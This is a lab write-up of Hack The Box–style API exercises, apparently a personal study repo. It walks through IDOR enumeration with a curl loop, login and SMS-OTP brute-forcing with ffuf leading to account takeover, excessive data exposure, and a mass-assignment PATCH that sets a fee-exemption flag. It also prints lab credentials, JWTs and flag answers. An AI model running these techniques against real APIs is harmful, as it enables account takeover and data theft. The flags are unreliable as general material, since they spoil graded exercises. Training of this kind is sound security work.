# API Attacks

This document outlines common techniques for identifying and exploiting **API related vulnerabilities**. It is intended as a practical, hands-on reference rather than a comprehensive theoretical guide.

---

# Table of Contents

- [API Attacks](#api-attacks)
  - [Overview](#overview)
  - [Broken Object Level Authorization (BOLA)](#broken-object-level-authorization-bola)
  - [Broken Authentication](#broken-authentication)
  - [Broken Object Property Level Authorization](#broken-object-property-level-authorization)
    - [Excessive Data Exposure](#excessive-data-exposure)
    - [Mass Assignment](#mass-assignment)

---

## Overview

Application Programming Interfaces (APIs) are a foundational component of modern software development. APIs act as an intermediary between applications, enabling communication and data exchange across different systems. At their core, APIs consist of well-defined rules and protocols that dictate how systems interact with one another.

There are several common API architectures, including **REST**, **SOAP**, **GraphQL**, and **gRPC**.

**Representational State Transfer (REST)** is the most widely adopted API architecture. It follows a **client–server model**, where clients request resources from a server using standard HTTP methods such as `GET`, `POST`, `PUT`, and `DELETE`. RESTful APIs are **stateless**, meaning each request contains all the information required for the server to process it. Responses are typically serialized in **JSON** or **XML** format.

**Simple Object Access Protocol (SOAP)** relies on XML-based messaging to facilitate communication between systems. SOAP APIs are highly standardized and provide extensive support for security, transactions, and error handling. However, they are generally more complex to implement and consume compared to RESTful APIs.

**GraphQL** offers a flexible and efficient approach to querying and modifying data. It allows clients to specify exactly which data they require, reducing both over-fetching and under-fetching. GraphQL operates through a single endpoint and uses a strongly typed query language to interact with backend data sources.

**gRPC** is a modern API architecture that uses **Protocol Buffers** for message serialization. It supports multiple programming languages and is commonly used in microservices and distributed systems due to its performance and efficiency.

While APIs are a critical enabler of modern applications, they also introduce a significant attack surface. The ten most critical API security risks include:

- Broken Object Level Authorization (BOLA)
    - The API allows authenticated users to access data they are not authorized to view.
- Broken Authentication
    - The authentication mechanisms can be bypassed or circumvented, enabling unauthorized access.
- Broken Object Property Level Authorization
    - The API exposes sensitive object properties or allows unauthorized manipulation of them.
- Unrestricted Resource Consumption
    - The API does not enforce limits on resource usage, enabling denial-of-service conditions.
- Broken Function Level Authorization
    - Unauthorized users are able to perform privileged or restricted operations.
- Unrestricted Access to Sensitive Business Flows
    - Sensitive workflows are exposed, potentially leading to financial or operational impact.
- Server Side Request Forgery (SSRF)
    - Insufficient validation allows attackers to coerce the server into making malicious internal requests.
- Security Misconfiguration
    - Improper configuration leads to vulnerabilities, including various injection flaws.
- Improper Inventory Management
    - API versions and endpoints are not properly tracked or secured.
- Unsafe Consumption of APIs
    - The API unsafely consumes third-party or internal APIs, propagating trust and security issues.

---

## Broken Object Level Authorization (BOLA)

Failing to verify that a user has ownership of, or permission to access, a specific resource through **object-level authorization mechanisms** can result in serious security vulnerabilities. This class of issue is known as **Broken Object Level Authorization (BOLA)** and is commonly referred to as **Insecure Direct Object Reference (IDOR)**.

The target application is vulnerable to [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html). A brief description of this weakness is provided below:

```
The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.
```

The following credentials are provided:

```
htbpentester2@pentestercompany.com:HTBPentester2
```

Authentication is performed via the following endpoint, which returns a **JSON Web Token (JWT)** upon successful login:

```
/api/v1/authentication/suppliers/sign-in
```

The authentication request is sent as JSON:

```json
{
  "Email": "htbpentester2@pentestercompany.com",
  "Password": "HTBPentester2"
}
```

![Filtered output](images/bola.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2Nzk3Mzk3NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.-_UeCTrm-n3TcFnd3MQL7fWsXFcndOkwy9M3D0jXMA-bJ5nFscGGVdrljuhB-bZTGpzWW21Ur1nRZeJHy4stSw"
}
```

![Filtered output](images/bola2.PNG)

The JWT is supplied to the API by using the `Authorize` feature in the Swagger interface:

![Filtered output](images/bola3.PNG)

After entering the token, authorization succeeds:

![Filtered output](images/bola4.PNG)

Next, endpoints within the **Suppliers** group are reviewed. An endpoint named `/api/v1/suppliers/current-user` is identified. The `current-user` naming convention suggests that the endpoint relies on the JWT to determine the authenticated user context.

![Filtered output](images/bola5.PNG)

Invoking this endpoint returns details associated with the authenticated supplier, including the internal `id` and `companyID` values:

```json
{
  "supplier": {
    "id": "781391c3-c6e3-4f42-bea4-1e71b6d9b4e7",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester2",
    "email": "htbpentester2@pentestercompany.com",
    "phoneNumber": "+44 9999 999992"
  }
}
```

![Filtered output](images/bola6.PNG)

Further inspection of the **Supplier** endpoints reveals the following endpoint, which accepts a user-controlled integer identifier:

```
/api/v1/suppliers/quarterly-reports/{ID}
```

![Filtered output](images/bola7.PNG)

By modifying the `{ID}` parameter, it is possible to retrieve quarterly reports belonging to other suppliers. For example, requesting the report with an `id` value of `2` returns data associated with a different supplier:

```json
{
  "supplierQuarterlyReport": {
    "id": 2,
    "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
    "quarter": 3,
    "year": 2022,
    "amountSold": 608221,
    "commentsFromManager": "Remarkable dedication! I'm full of admiration for your efforts! Get ready for a custom-tailored reward!"
  }
}
```

![Filtered output](images/bola8.PNG)

This confirms the presence of a **BOLA/IDOR** vulnerability, as the API does not enforce ownership or authorization checks on the requested object.

The vulnerability can be abused at scale by iterating over sequential report identifiers. Using the `curl` command generated by the Swagger interface as a base, a simple Bash script is created to retrieve multiple reports:

```bash
#!/usr/bin/env bash

for ((i=1; i<= 20; i++)); do
    curl -s -w "\n" -X 'GET' \
    "http://83.136.249.164:34382/api/v1/suppliers/quarterly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer <JWT>' | jq >> reports.txt
done
```

The script fetches the first 20 quarterly reports and stores them in `reports.txt`.

Searching the output file reveals the flag:

```bash
grep -i "htb" reports.txt
```

Flag:

```
HTB{e76651e1f516eb5d7260621c26754776}
```

![Filtered output](images/bola9.PNG)

This vulnerability allows **authenticated users to access sensitive financial and operational data belonging to other suppliers** by simply modifying a numeric identifier. The lack of object-level authorization checks enables large-scale data exposure and demonstrates a critical API security flaw.

For a more in depth explanation of IDOR vulnerabilities, check out the `web-attacks` directory in this same Github repository. 

---

## Broken Authentication

An API suffers from **Broken Authentication** when weaknesses in its authentication mechanisms allow attackers to bypass identity verification or compromise user accounts.

The target application is vulnerable to [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html). A brief description of this weakness is shown below:

```
The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame.
```

The following valid credentials are provided:

```
htbpentester3@hackthebox.com:HTBPentester3
```

Authentication is performed through the following endpoint, which issues a **JSON Web Token (JWT)** upon successful login:

```
/api/v1/authentication/customers/sign-in
```

The authentication request is sent as JSON:

```json
{
  "Email": "htbpentester3@pentestercompany.com",
  "Password": "HTBPentester3"
}
```

![Filtered output](images/broken-auth.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjNAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJzX1VwZGF0ZUJ5Q3VycmVudFVzZXIiLCJDdXN0b21lcnNfR2V0IiwiQ3VzdG9tZXJzX0dldEFsbCJdLCJleHAiOjE3Njc5ODY0OTYsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.U6R1F97VFAehHfLRXuDO4VBIav_h-3CEMeEAmWRiVMTMuJgRkDe6LPMGgZaWQH2_tPGy2KuPM-pZ5Ki9IR4DHw"
}
```

![Filtered output](images/broken-auth2.PNG)

The JWT is supplied to the API using the `Authorize` feature in the Swagger interface:

![Filtered output](images/broken-auth3.PNG)

Authorization succeeds after providing the token:

![Filtered output](images/broken-auth4.PNG)

Querying the `/api/v1/roles/current-user` endpoint reveals that the authenticated user is assigned the following roles:

- `Customers_UpdateByCurrentUser`
- `Customers_Get`
- `Customers_GetAll`

![Filtered output](images/broken-auth5.PNG)

The `Customers_GetAll` role permits access to the `/api/v1/customers` endpoint, which returns records for all customers:

```
http://83.136.248.107:32741/api/v1/customers
```

![Filtered output](images/broken-auth6.PNG)

This endpoint exposes sensitive information such as email addresses, phone numbers, and birth dates. While this constitutes an authorization issue, it does not directly allow account takeover.

Inspection of the `/api/v1/customers/current-user` **PATCH** endpoint shows that it allows authenticated users to update their profile details, including their password:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "648561703358742276159723599389",
    "BirthDate": "1992-01-09",
    "Password": "string"
  }
}
```

![Filtered output](images/broken-auth7.PNG)

When attempting to set a weak password such as `passw`, the API rejects the request, indicating a minimum password length requirement:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "648561703358742276159723599389",
    "BirthDate": "1992-01-09",
    "Password": "passw"
  }
}
```

Response:

```json
{
  "StatusCode": 400,
  "Message": "One or more errors occurred!",
  "Errors": {
    "UpdatedCustomer.Password": [
      "Password must be at least 6 characters long"
    ]
  }
}
```

This response discloses password policy details, revealing that the API enforces only a minimal length requirement.

When the password is set to a weak but valid value such as `123456`, the update succeeds:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "648561703358742276159723599389",
    "BirthDate": "1992-01-09",
    "Password": "123456"
  }
}
```

![Filtered output](images/broken-auth9.PNG)

Response:

```json
{
  "successStatus": true
}
```

![Filtered output](images/broken-auth10.PNG)

This confirms the presence of a **weak password policy**, making brute-force and credential abuse viable.

To prepare for brute-force testing, an invalid login attempt is made to observe the error message returned by the authentication endpoint:

```json
{
  "Email": "htbpentester3@hackthebox.com",
  "Password": "invalidPassword"
}
```

Response:

```json
{
  "errorMessage": "Invalid Credentials"
}
```

A custom wordlist containing passwords of at least six characters is generated from the `xato-net-10-million-passwords-100000.txt` list:

```bash
grep -E '^.{6,}$' xato-net-10-million-passwords-100000.txt > xato_6plus.txt
```

Brute-force attempts are performed using `ffuf`, filtering out invalid responses:

```bash
ffuf -w xato_6plus.txt:FUZZ -request req.txt -request-proto http -fr "Invalid Credentials"
```

No valid credentials are discovered, suggesting that the target account uses a password with sufficient entropy.

Since direct authentication brute-forcing fails, the password reset functionality is evaluated.

An OTP reset request is initiated by supplying the victim’s email address:

```
/api/v1/authentication/customers/passwords/resets/sms-otps
```

The response indicates success:

```json
{
  "SuccessStatus": true
}
```

![Filtered output](images/broken-auth12.PNG)

The password reset confirmation endpoint requires an OTP value:

```
/api/v1/authentication/customers/passwords/resets
```

Although the OTP is sent to the victim, the API does not enforce rate limiting or lockout mechanisms. Since OTP values are typically numeric and short, a brute-force attack is feasible.

A four-digit OTP wordlist is generated:

```bash
seq -w 0 9999 > otp.txt
```

An invalid OTP attempt returns the following response:

```json
{
  "SuccessStatus": false
}
```

This response is used as a filter condition during brute-force attempts:

```bash
ffuf -w otp.txt:FUZZ -request req.txt -request-proto http -fr "false"
```

A valid OTP is successfully identified:

```
6307
```

![Filtered output](images/broken-auth11.PNG)

Using the valid OTP, the victim’s password is reset to `123456`:

```json
{
  "Email": "MasonJenkins@ymail.com",
  "OTP": "6307",
  "NewPassword": "123456"
}
```

![Filtered output](images/broken-auth13.PNG)

The new credentials are then used to authenticate successfully:

```json
{
  "Email": "MasonJenkins@ymail.com",
  "Password": "123456"
}
```

Response:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3Njc5OTU1NjEsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.1A_G7v1DvXzGanotgvxoYVPOwegnXHVFMfNAhSN5aoxBwmgU6yp1gnlDMjOsb43i_amRLQkXUpg9byugTe0V0A"
}
```

After supplying the JWT via the `Authorize` interface, querying `/api/v1/customers/current-user` confirms successful account takeover:

![Filtered output](images/broken-auth14.PNG)


```json
{
  "customer": {
    "id": "53428a83-8591-4548-a553-c434ad76a61a",
    "name": "Mason Jenkins",
    "email": "MasonJenkins@ymail.com",
    "phoneNumber": "+44 7451 162707",
    "birthDate": "1985-09-16"
  }
}
```

![Filtered output](images/broken-auth15.PNG)

With full access to the compromised account, sensitive financial data can be accessed via the following endpoint:

```
/api/v1/customers/payment-options/current-user
```

Response:

```json
{
  "customerPaymentOptions": [
    {
      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
      "type": "Debit Card",
      "provider": "Capital One",
      "accountNumber": "9754729874181436",
      "cvvHash": "B6EDC1CD1F36E45DAF6D7824D7BB2283"
    },
    {
      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
      "type": "Credit Card",
      "provider": "HTB Academy",
      "accountNumber": "HTB{115a6329120e9eff13c4ec6a63343ed1}",
      "cvvHash": "5EF0B4EBA35AB2D6180B0BCA7E46B6F9"
    }
  ]
}
```

This vulnerability chain demonstrates how weak password policies, missing rate limiting, and brute-forceable OTP mechanisms can be combined to achieve full account takeover. An attacker can reset arbitrary user passwords and gain unauthorized access to sensitive personal and financial data.

For a deeper explanation of **broken authentication**, check out the `broken-authentication.md` document in the `broken-authentication` directory.

---

## Broken Object Property Level Authorization

**Broken Object Property Level Authorization** vulnerabilities occur when an API exposes or allows modification of object properties beyond a user’s authorized scope. This category includes two primary subclasses:

- Excessive Data Exposure
- Mass Assignment

An API endpoint is vulnerable to **Excessive Data Exposure** when it reveals sensitive object properties to **authorized users** who should not have access to that data.

An API endpoint is vulnerable to **Mass Assignment** when it allows **authorized users** to modify object properties that should be immutable or restricted.

### Excessive Data Exposure

The target is vulnerable to [CWE-213, Exposure of Sensitive Information Due to Incompatible Policies](https://cwe.mitre.org/data/definitions/213.html).

A brief description of this weakness is provided below:

```
The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.
```

We are provided with valid credentials:

```
htbpentester4@hackthebox.com:HTBPentester4
```

Authentication is performed via the `/api/v1/authentication/customers/sign-in` endpoint to obtain a valid JSON Web Token (JWT):

```
{
  "Email": "htbpentester4@hackthebox.com",
  "Password": "HTBPentester4"
}
```

![Filtered output](images/data-exposure.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjRAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiXSwiZXhwIjoxNzY4MDM5NjE3LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.-ipwwlk6ejD5mxlJRHKGnj-XCMfKFey3h9yvpePaqqy5AKMfsoAyJOlPFBl_FCg_GwAeSLa0P2AOXsVy9WGECA"
}
```

The JWT is supplied using the `Authorize` functionality:

![Filtered output](images/data-exposure2.PNG)

Querying the `/api/v1/roles/current-user` endpoint reveals that the authenticated user has been assigned the following roles:

- `Suppliers_Get`
- `Suppliers_GetAll`

![Filtered output](images/data-exposure3.PNG)

Invoking the `/api/v1/suppliers` **GET** endpoint returns a list of suppliers that includes sensitive properties such as:

- `id`
- `companyID`
- `name`
- `email`
- `phoneNumber`

![Filtered output](images/data-exposure4.PNG)

While allowing customers to view supplier listings is typical for e-commerce platforms, exposing **direct contact information** such as email addresses and phone numbers is inappropriate. This information enables customers to bypass the marketplace entirely by contacting suppliers directly, undermining the platform’s business model.

This behavior demonstrates a clear case of **excessive data exposure**, where sensitive fields are unnecessarily returned to authorized users.

### Mass Assignment

The target is vulnerable to [CWE-915, Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html). 

A brief description of the weakness is shown below:

```
The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.
```

We are provided with valid supplier credentials:

```
htbpentester6@pentestercompany.com:HTBPentester6
```

Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:

```
{
  "Email": "htbpentester6@pentestercompany.com",
  "Password": "HTBPentester6"
}
```

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjZAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfVXBkYXRlIiwiU3VwcGxpZXJDb21wYW5pZXNfR2V0Il0sImV4cCI6MTc2ODA0MTU0MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.FQ6madAV-SDGm0msFnZ4DGaAFuqgfM3UxQo-fOnCbVM4Nj0grPSmiBf7iYCXj6Ap0hRgytB3EU8qZ8Yh_ktvIw"
}
```

After authorizing with the JWT, querying `/api/v1/roles/current-user` shows that the authenticated user has the following roles:

- `SupplierCompanies_Update`
- `SupplierCompanies_Get`

![Filtered output](images/mass-assignment.PNG)

The `/api/v1/supplier-companies/current-user` endpoint reveals that the supplier company associated with the authenticated user (`PentesterCompany`) has the following property set:

```json
"isExemptedFromMarketplaceFee": 0
```

![Filtered output](images/mass-assignment2.PNG)

This indicates that the supplier company is subject to marketplace fees on each sale.

Examining the `/api/v1/supplier-companies` **PATCH** endpoint reveals that it accepts user-controlled input for the `IsExemptedFromMarketplaceFee` field:

 ```json
 {
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "string",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "string"
  }
}
 ```

 ![Filtered output](images/mass-assignment3.PNG)

An initial request fails due to missing required fields:

  ```json
{
  "StatusCode": 400,
  "Message": "One or more errors occurred!",
  "Errors": {
    "UpdatedSupplierCompany.SupplierCompanyID": [
      "The JSON value is not in a supported Guid format."
    ]
  }
}
 ```

We must provide a value for the `SupplierCompanyID` and `CertificateOfIncorporationPDFFileURI`. The required values can be obtained from the `/api/v1/supplier-companies/current-user` endpoint:

 ```json
 {
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
 ```

Using this information, we resend the **PATCH** request with all required fields populated:

 ```json
 {
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
 ```

The server responds successfully:

 ```json
 {
  "successStatus": true
}
 ```

![Filtered output](images/mass-assignment4.PNG)

Revisiting the `/api/v1/supplier-companies/current-user` endpoint confirms that the value has been updated:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 1,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

![Filtered output](images/mass-assignment5.PNG)

This confirms that the authenticated supplier was able to modify a **business-critical property** that should not be user-controllable.

The endpoint fails to enforce proper property-level authorization, allowing suppliers to exempt themselves from marketplace fees. This **mass assignment vulnerability** directly impacts platform revenue and demonstrates inadequate server-side validation of modifiable object attributes.

---
